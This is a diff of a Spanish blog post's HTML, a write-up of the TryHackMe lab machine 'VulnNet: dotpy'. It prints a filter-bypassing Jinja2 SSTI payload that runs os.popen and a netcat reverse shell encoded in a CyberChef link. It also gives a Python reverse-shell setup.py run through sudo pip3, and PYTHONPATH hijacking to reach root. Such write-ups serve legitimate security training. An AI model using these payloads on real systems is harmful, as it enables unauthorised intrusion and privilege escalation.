@@ -1,15 +1,131 @@
-<!doctype html><html lang=es><head><title>VulnNet: dotpy - Write Up - Español ::
-Lanfran02 - Blog — Hackeando tu forma de aprender.</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Link Nivel Creador     Aquí Medio TheCyb3rW0lf    Reconocimiento Primero escaneamos la máquina con nmap para verificar qué puertos están abiertos/cerrados/filtrados.
-╰─ lanfran@parrot ❯ map 10.10.43.197 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 12:49 CEST Nmap scan report for 10.10.43.197 Host is up (0.067s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 8080/tcp open http Werkzeug httpd 1."><meta name=keywords content="CTF,Writeup,Hacking"><meta name=robots content="noodp"><link rel=canonical href=/es/posts/vulnnet-dotpy/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/style.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/img/favicon.png><link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/es/posts/vulnnet-dotpy/cover.png"><meta name=twitter:title content="VulnNet: dotpy - Write Up - Español"><meta name=twitter:description content="Máquina de nivel medio en TryHackMe."><meta property="og:title" content="VulnNet: dotpy - Write Up - Español"><meta property="og:description" content="Máquina de nivel medio en TryHackMe."><meta property="og:type" content="article"><meta property="og:url" content="/es/posts/vulnnet-dotpy/"><meta property="og:image" content="/es/posts/vulnnet-dotpy/cover.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-12T12:39:34+02:00"><meta property="article:modified_time" content="2021-07-12T12:39:34+02:00"><meta property="og:site_name" content="Lanfran02 - Blog"><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/es/ class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>Lanfran02</span>
-<span class=logo__cursor></span></a><span class=header__right><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Write Ups
-<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span></li><ul class="menu__sub-inner-more hidden"><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><h1 class=post-title>VulnNet: dotpy - Write Up - Español</h1><div class=post-meta><span class=post-date>2021-07-12</span>
+<!doctype html><html lang=es>
+<head>
+<title>
+VulnNet: dotpy - Write Up - Español ::
+Lanfran02 - Blog — Hackeando tu forma de aprender.
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="Link Nivel Creador     Aquí Medio TheCyb3rW0lf    Reconocimiento Primero escaneamos la máquina con nmap para verificar qué puertos están abiertos/cerrados/filtrados.
+╰─ lanfran@parrot ❯ map 10.10.43.197 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 12:49 CEST Nmap scan report for 10.10.43.197 Host is up (0.067s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 8080/tcp open http Werkzeug httpd 1.">
+<meta name=keywords content="CTF,Writeup,Hacking">
+<meta name=robots content="noodp">
+<link rel=canonical href=/es/posts/vulnnet-dotpy/>
+<link rel=stylesheet href=/assets/style.css>
+<link rel=stylesheet href=/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=/img/favicon.png>
+<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="/es/posts/vulnnet-dotpy/cover.png">
+<meta name=twitter:title content="VulnNet: dotpy - Write Up - Español">
+<meta name=twitter:description content="Máquina de nivel medio en TryHackMe.">
+<meta property="og:title" content="VulnNet: dotpy - Write Up - Español">
+<meta property="og:description" content="Máquina de nivel medio en TryHackMe.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="/es/posts/vulnnet-dotpy/"><meta property="og:image" content="/es/posts/vulnnet-dotpy/cover.png"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-07-12T12:39:34+02:00">
+<meta property="article:modified_time" content="2021-07-12T12:39:34+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+</head>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/es/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>Lanfran02</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/es/about>Acerca de mí</a></li>
+<li><a href=/>English</a></li>
+<ul class=menu__sub-inner>
+<li class=menu__sub-inner-more-trigger>
+Write Ups
+<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+</li>
+<ul class="menu__sub-inner-more hidden">
+<li><a href=/es/tags/hackthebox/>HTB</a></li>
+<li><a href=/es/tags/tryhackme/>THM</a></li>
+</ul>
+</ul>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/es/about>Acerca de mí</a></li>
+<li><a href=/>English</a></li>
+<li><a href=/es/tags/hackthebox/>HTB</a></li>
+<li><a href=/es/tags/tryhackme/>THM</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>VulnNet: dotpy - Write Up - Español</h1>
+<div class=post-meta>
+<span class=post-date>
+2021-07-12
+</span>
 <span class=post-author>— Escrito por Lanfran02</span>
-<span class=post-read-time>— 3 mins lectura</span></div><span class=post-tags><a href=/tags/ssti/>#SSTI</a>&nbsp;
+<span class=post-read-time>— 3 mins lectura</span>
+</div>
+<span class=post-tags>
+<a href=/tags/ssti/>#SSTI</a>&nbsp;
 <a href=/tags/python/>#Python</a>&nbsp;
 <a href=/tags/77/>#{{7*7}}</a>&nbsp;
 <a href=/tags/burpsuite/>#Burpsuite</a>&nbsp;
 <a href=/tags/sudo/>#sudo</a>&nbsp;
-<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;</span><figure class=post-cover><img src=/es/posts/vulnnet-dotpy/cover.png alt="VulnNet: dotpy - Write Up - Español"></figure><div class=post-content><h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents><ul><li><a href=#reconocimiento>Reconocimiento</a></li><li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table><thead><tr><th>Link</th><th>Nivel</th><th>Creador</th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/vulnnetdotpy>Aquí</a></td><td>Medio</td><td><a href=https://tryhackme.com/p/TheCyb3rW0lf>TheCyb3rW0lf</a></td></tr></tbody></table><h2 id=reconocimiento>Reconocimiento</h2><p>Primero escaneamos la máquina con <code>nmap</code> para verificar qué puertos están abiertos/cerrados/filtrados.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ map 10.10.43.197                                                                                               ─╯
+<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
+</span>
+<figure class=post-cover>
+<img src=/es/posts/vulnnet-dotpy/cover.png alt="VulnNet: dotpy - Write Up - Español">
+</figure>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li><a href=#reconocimiento>Reconocimiento</a></li>
+<li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li>
+<li><a href=#root>Root</a></li>
+</ul>
+</nav></aside>
+<table>
+<thead>
+<tr>
+<th>Link</th>
+<th>Nivel</th>
+<th>Creador</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href=https://tryhackme.com/room/vulnnetdotpy>Aquí</a></td>
+<td>Medio</td>
+<td><a href=https://tryhackme.com/p/TheCyb3rW0lf>TheCyb3rW0lf</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id=reconocimiento>Reconocimiento</h2>
+<p>Primero escaneamos la máquina con <code>nmap</code> para verificar qué puertos están abiertos/cerrados/filtrados.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ map 10.10.43.197                                                                                               ─╯
 <span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
 Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-07-12 12:49 CEST
 Nmap scan report <span style=color:#66d9ef>for</span> 10.10.43.197
@@ -22,8 +138,27 @@ PORT     STATE SERVICE VERSION
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 40.12 seconds
-</code></pre></div><p>¡Bien! Tenemos un servidor web <code>Python</code> que se ejecuta en el puerto 8080.</p><p>Vamos a navegar hacia el.</p><p>La página nos solicita iniciar sesión/registrarnos. Pero intenté navegar a una página que no existía.</p><p><img src=not_registered.png alt=not_registered></p><p>Mmmm una página 403, que nos obliga a iniciar sesión&mldr;</p><p>Así que hagámoslo, creemos un usuario ficticio e inicie sesión, para que podamos navegar a esa página de nuevo&mldr;</p><p>Una vez que haya iniciado sesión, navegue de nuevo a la página que no existe y veamos algo muy interesante.</p><p><img src=logged_in.png alt=logged_in></p><p>La página nos muestra la página solicitada, tal vez podamos explotar esto&mldr;</p><p>Así que utilicé el exploit común <code>{{7 * 7}}</code> para comprobar si era vulnerable, ¡¡y devolvió 49 !!</p><p><img src=exploit.png alt=exploit></p><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2><p>So we can exploit this with the following code.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>{{request<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;application&#39;</span>)<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>globals</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>getitem</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>)(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>builtins</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>getitem</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>)(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>import</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>)(<span style=color:#e6db74>&#39;os&#39;</span>)<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;popen&#39;</span>)(<span style=color:#e6db74>&#39;###CODE###&#39;</span>)<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;read&#39;</span>)()}}
-</code></pre></div><p>Where says <code>###CODE###</code> you can just put your system command, so let&rsquo;s use <code>burpsuite</code> to send the request with <code>id</code> and see which user are we</p><p><img src=id.png alt=id></p><p>Good! We are the <code>web</code> user, let&rsquo;s encode our shell to hex so we can run it, here you have the shell and the perfect encoding in a <a href="https://gchq.github.io/CyberChef/#recipe=To_Hex('%5C%5Cx',0)&input=cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2BJjF8bmMgSVAgMTMzNyA%2BL3RtcC9m">Cyberchef recipe</a> !</p><p>Send it with burpsuite, and get your reverse shell with <code>netcat</code></p><p><img src=user.png alt=user></p><p>Perfect! We now have a reverse shell, so let&rsquo;s first run <code>sudo -l</code> to see if our user can run a command with any other user</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>web@vulnnet-dotpy:~$ sudo -l
+</code></pre></div><p>¡Bien! Tenemos un servidor web <code>Python</code> que se ejecuta en el puerto 8080.</p>
+<p>Vamos a navegar hacia el.</p>
+<p>La página nos solicita iniciar sesión/registrarnos. Pero intenté navegar a una página que no existía.</p>
+<p><img src=not_registered.png alt=not_registered></p>
+<p>Mmmm una página 403, que nos obliga a iniciar sesión&mldr;</p>
+<p>Así que hagámoslo, creemos un usuario ficticio e inicie sesión, para que podamos navegar a esa página de nuevo&mldr;</p>
+<p>Una vez que haya iniciado sesión, navegue de nuevo a la página que no existe y veamos algo muy interesante.</p>
+<p><img src=logged_in.png alt=logged_in></p>
+<p>La página nos muestra la página solicitada, tal vez podamos explotar esto&mldr;</p>
+<p>Así que utilicé el exploit común <code>{{7 * 7}}</code> para comprobar si era vulnerable, ¡¡y devolvió 49 !!</p>
+<p><img src=exploit.png alt=exploit></p>
+<h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2>
+<p>So we can exploit this with the following code.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>{{request<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;application&#39;</span>)<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>globals</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>getitem</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>)(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>builtins</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>getitem</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>)(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>import</span><span style=color:#ae81ff>\x5f\x5f</span><span style=color:#e6db74>&#39;</span>)(<span style=color:#e6db74>&#39;os&#39;</span>)<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;popen&#39;</span>)(<span style=color:#e6db74>&#39;###CODE###&#39;</span>)<span style=color:#f92672>|</span>attr(<span style=color:#e6db74>&#39;read&#39;</span>)()}}
+</code></pre></div><p>Where says <code>###CODE###</code> you can just put your system command, so let&rsquo;s use <code>burpsuite</code> to send the request with <code>id</code> and see which user are we</p>
+<p><img src=id.png alt=id></p>
+<p>Good! We are the <code>web</code> user, let&rsquo;s encode our shell to hex so we can run it, here you have the shell and the perfect encoding in a <a href="https://gchq.github.io/CyberChef/#recipe=To_Hex('%5C%5Cx',0)&input=cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2BJjF8bmMgSVAgMTMzNyA%2BL3RtcC9m">Cyberchef recipe</a> !</p>
+<p>Send it with burpsuite, and get your reverse shell with <code>netcat</code></p>
+<p><img src=user.png alt=user></p>
+<p>Perfect! We now have a reverse shell, so let&rsquo;s first run <code>sudo -l</code> to see if our user can run a command with any other user</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>web@vulnnet-dotpy:~$ sudo -l
 Matching Defaults entries <span style=color:#66d9ef>for</span> web on vulnnet-dotpy:
     env_reset, mail_badpass,
     secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
@@ -31,7 +166,9 @@ Matching Defaults entries <span style=color:#66d9ef>for</span> web on vulnnet-do
 User web may run the following commands on vulnnet-dotpy:
     <span style=color:#f92672>(</span>system-adm<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/pip3 install *
 web@vulnnet-dotpy:~$
-</code></pre></div><p>Interesante, podemos ejecutar <code>pip3 install</code> con el usuario <code>system-adm</code>&mldr;</p><p>Al leer la página <a href=https://gtfobins.github.io/gtfobins/pip/#shell>GTFOBins</a>, creé otra shell reversa:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>########VICTIMA</span>
+</code></pre></div><p>Interesante, podemos ejecutar <code>pip3 install</code> con el usuario <code>system-adm</code>&mldr;</p>
+<p>Al leer la página <a href=https://gtfobins.github.io/gtfobins/pip/#shell>GTFOBins</a>, creé otra shell reversa:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>########VICTIMA</span>
 web@vulnnet-dotpy:/tmp/project$ cat setup.py 
 import socket,subprocess,os;s<span style=color:#f92672>=</span>socket.socket<span style=color:#f92672>(</span>socket.AF_INET,socket.SOCK_STREAM<span style=color:#f92672>)</span>;s.connect<span style=color:#f92672>((</span><span style=color:#e6db74>&#34;10.9.2.160&#34;</span>,1338<span style=color:#f92672>))</span>;os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,0<span style=color:#f92672>)</span>; os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,1<span style=color:#f92672>)</span>; os.dup2<span style=color:#f92672>(</span>s.fileno<span style=color:#f92672>()</span>,2<span style=color:#f92672>)</span>;p<span style=color:#f92672>=</span>subprocess.call<span style=color:#f92672>([</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span>,<span style=color:#e6db74>&#34;-i&#34;</span><span style=color:#f92672>])</span>;
 web@vulnnet-dotpy:/tmp/project$ sudo -u system-adm /usr/bin/pip3 install .
@@ -47,25 +184,68 @@ uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>syste
 w$whoami
 system-adm
 $ cat /home/system-adm/user.txt
-THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
+THM<span style=color:#f92672>{[</span>REDACTADO<span style=color:#f92672>]}</span>
 $
-</code></pre></div><p>¡Y ahora podemos leer la bandera del usuario!</p><h2 id=root>Root</h2><p>Una vez más con este nuevo usuario, ejecuté <code>sudo -l</code> y obtenemos este resultado:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>system-adm@vulnnet-dotpy:~$ sudo -l
+</code></pre></div><p>¡Y ahora podemos leer la bandera del usuario!</p>
+<h2 id=root>Root</h2>
+<p>Una vez más con este nuevo usuario, ejecuté <code>sudo -l</code> y obtenemos este resultado:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>system-adm@vulnnet-dotpy:~$ sudo -l
 Matching Defaults entries <span style=color:#66d9ef>for</span> system-adm on vulnnet-dotpy:
     env_reset, mail_badpass,
     secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
 
 User system-adm may run the following commands on vulnnet-dotpy:
     <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
-</code></pre></div><p>Podemos aprovechar una vulnerabilidad de Pythonpath, en estos sencillos pasos:</p><ol><li>Cree una &ldquo;biblioteca de python&rdquo; maliciosa llamada &ldquo;zipfile.py&rdquo; (que está siendo utilizada por el script <code>backup.py</code>) en<code>/tmp</code></li><li>Ejecute este comando <code>sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/backup.py</code></li></ol><ol><li></li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>system-adm@vulnnet-dotpy:~$ echo <span style=color:#e6db74>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span> &gt; /tmp/zipfile.py
+</code></pre></div><p>Podemos aprovechar una vulnerabilidad de Pythonpath, en estos sencillos pasos:</p>
+<ol>
+<li>Cree una &ldquo;biblioteca de python&rdquo; maliciosa llamada &ldquo;zipfile.py&rdquo; (que está siendo utilizada por el script <code>backup.py</code>) en<code>/tmp</code></li>
+<li>Ejecute este comando <code>sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/backup.py</code></li>
+</ol>
+<ol>
+<li></li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>system-adm@vulnnet-dotpy:~$ echo <span style=color:#e6db74>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span> &gt; /tmp/zipfile.py
 system-adm@vulnnet-dotpy:~$ cat /tmp/zipfile.py 
 import pty; pty.spawn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span><span style=color:#f92672>)</span>
-</code></pre></div><ol start=2><li></li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>system-adm@vulnnet-dotpy:~$ sudo PYTHONPATH<span style=color:#f92672>=</span>/tmp/ /usr/bin/python3 /opt/backup.py
+</code></pre></div><ol start=2>
+<li></li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>system-adm@vulnnet-dotpy:~$ sudo PYTHONPATH<span style=color:#f92672>=</span>/tmp/ /usr/bin/python3 /opt/backup.py
 root@vulnnet-dotpy:/home/system-adm# id
 uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
 root@vulnnet-dotpy:/home/system-adm# whoami
 root
 root@vulnnet-dotpy:/home/system-adm# cat /root/root.txt 
-THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
+THM<span style=color:#f92672>{[</span>REDACTADO<span style=color:#f92672>]}</span>
 root@vulnnet-dotpy:/home/system-adm# 
-</code></pre></div><p>¡Y hemos rooteado la máquina!</p><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Leer otros posts</span><hr></div><div class=pagination__buttons><span class="button next"><a href=/es/posts/cold_vvars/><span class=button__text>Cold VVars - Write Up - Español</span>
-<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user">Lanfran02</div></div></footer><script src=/assets/main.js></script><script src=/assets/prism.js></script></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script></body></html>
+</code></pre></div><p>¡Y hemos rooteado la máquina!</p>
+<p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p>
+</div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Leer otros posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button next">
+<a href=/es/posts/cold_vvars/>
+<span class=button__text>Cold VVars - Write Up - Español</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user">Lanfran02</div>
+</div>
+</footer>
+<script src=/assets/main.js></script>
+<script src=/assets/prism.js></script>
+</div>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
